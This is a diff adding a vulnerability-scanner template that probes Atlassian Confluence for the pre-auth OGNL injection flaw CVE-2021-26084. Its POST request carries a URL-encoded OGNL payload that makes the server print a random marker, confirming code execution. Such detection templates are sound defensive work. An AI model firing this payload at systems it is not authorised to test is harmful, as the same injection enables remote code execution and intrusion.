@@ -1,0 +1,17 @@
+name: poc-confluence-ognl
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/pages/createpage-entervariables.action?SpaceKey=x"
+      body: "queryString=test%0a%25%7b%28%23a%3d%40org.apache.struts2.ServletActionContext%40getServletContext%28%29.getAttribute%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%29.%28%23a.setContentType%28%27text%2fhtml%27%29.%28%23a.getWriter%28%29.print%28%27{{r0}}%27%29%29%29%7d"
+    expression: response.status == 200 && response.body.bcontains("{{r0}}")
+expression: r0()
+detail:
+  author: sxel
+  description: Atlassian Confluence OGNL injection RCE probe (CVE-2021-26084, pre-auth on affected versions)
+  severity: critical
+  tags: confluence,atlassian,ognl,rce
